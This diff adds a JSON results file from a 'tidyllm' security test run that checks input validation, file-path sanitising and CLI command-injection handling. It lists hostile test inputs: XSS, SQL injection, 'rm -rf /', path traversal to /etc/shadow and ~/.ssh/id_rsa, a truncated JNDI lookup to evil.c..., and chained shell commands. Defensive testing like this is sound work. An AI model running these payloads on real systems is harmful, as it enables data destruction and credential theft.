@@ -1,0 +1,175 @@
+{
+  "test_type": "tidyllm_security",
+  "timestamp": "2025-09-03T12:58:07.201296",
+  "results": {
+    "input_validation_security": {
+      "status": "FAIL",
+      "message": "Security validation failed",
+      "security_results": {
+        "<script>alert('xss')...": {
+          "blocked": true,
+          "reason": "contains_forbidden_keywords"
+        },
+        "javascript:alert('xs...": {
+          "blocked": true,
+          "reason": "contains_forbidden_keywords"
+        },
+        "eval('malicious code...": {
+          "blocked": true,
+          "reason": "contains_forbidden_keywords"
+        },
+        "exec('rm -rf /')...": {
+          "blocked": true,
+          "reason": "contains_forbidden_keywords"
+        },
+        "__import__('os').sys...": {
+          "blocked": true,
+          "reason": "contains_forbidden_keywords"
+        },
+        "'; DROP TABLE users;...": {
+          "blocked": false,
+          "reason": "all_validations_passed"
+        },
+        "../../../etc/passwd...": {
+          "blocked": false,
+          "reason": "all_validations_passed"
+        },
+        "${jndi:ldap://evil.c...": {
+          "blocked": false,
+          "reason": "all_validations_passed"
+        }
+      }
+    },
+    "configuration_security": {
+      "status": "SUCCESS",
+      "message": "Configuration security maintained",
+      "security_check": {
+        "sensitive_data_found": [
+          [
+            "api_key",
+            false
+          ],
+          [
+            "partial_key",
+            false
+          ],
+          [
+            "key_field",
+            false
+          ]
+        ],
+        "info_keys": [
+          "version",
+          "backend",
+          "config",
+          "metrics",
+          "team_contributions"
+        ],
+        "security_breach": false
+      }
+    },
+    "file_access_security": {
+      "status": "SUCCESS",
+      "message": "File access security working",
+      "security_results": {
+        "../../../etc/passwd": {
+          "key_sanitized": true,
+          "operation_completed": true
+        },
+        "..\\..\\..\\windows\\system32\\config\\sam": {
+          "key_sanitized": true,
+          "operation_completed": true
+        },
+        "/etc/shadow": {
+          "key_sanitized": true,
+          "operation_completed": true
+        },
+        "C:\\Windows\\System32\\config\\SAM": {
+          "key_sanitized": true,
+          "operation_completed": true
+        },
+        "~/.ssh/id_rsa": {
+          "key_sanitized": true,
+          "operation_completed": true
+        },
+        "/proc/version": {
+          "key_sanitized": true,
+          "operation_completed": true
+        }
+      }
+    },
+    "drop_zones_security": {
+      "status": "SUCCESS",
+      "message": "Drop zones security features working",
+      "security_features": {
+        "auto_create_disabled": true,
+        "restricted_file_patterns": true,
+        "defined_events": true,
+        "backend_specified": true
+      }
+    },
+    "cli_command_injection": {
+      "status": "SUCCESS",
+      "message": "CLI injection protection working",
+      "security_results": {
+        "attempt_1": {
+          "args": {
+            "backend": "mock; rm -rf /"
+          },
+          "executed_safely": true,
+          "result_summary": "{'status': 'initialized', 'backend': 'DirectBackend'}"
+        },
+        "attempt_2": {
+          "args": {
+            "backend": "mock && echo 'pwned'"
+          },
+          "executed_safely": true,
+          "result_summary": "{'status': 'initialized', 'backend': 'DirectBackend'}"
+        },
+        "attempt_3": {
+          "args": {
+            "backend": "mock | cat /etc/passwd"
+          },
+          "executed_safely": true,
+          "result_summary": "{'status': 'initialized', 'backend': 'DirectBackend'}"
+        },
+        "attempt_4": {
+          "args": {
+            "signature": "input -> output; ls -la"
+          },
+          "blocked_by_exception": true,
+          "error": "invalid syntax (<unknown>, line 1)"
+        },
+        "attempt_5": {
+          "args": {
+            "action": "status; whoami"
+          },
+          "executed_safely": true,
+          "result_summary": "None"
+        },
+        "attempt_6": {
+          "args": {
+            "drop_zones_action": "list; cat ~/.ssh/id_rsa"
+          },
+          "blocked_by_exception": true,
+          "error": "Unknown drop zones action: list; cat ~/.ssh/id_rsa"
+        }
+      }
+    },
+    "error_information_disclosure": {
+      "status": "SUCCESS",
+      "message": "Error disclosure protection working",
+      "disclosure_check": {
+        "error_count": 0,
+        "sensitive_info_found": [],
+        "sample_errors": []
+      }
+    }
+  },
+  "summary": {
+    "total_tests": 6,
+    "passed": 5,
+    "failed": 1,
+    "success_rate": "83.3%"
+  }
+}
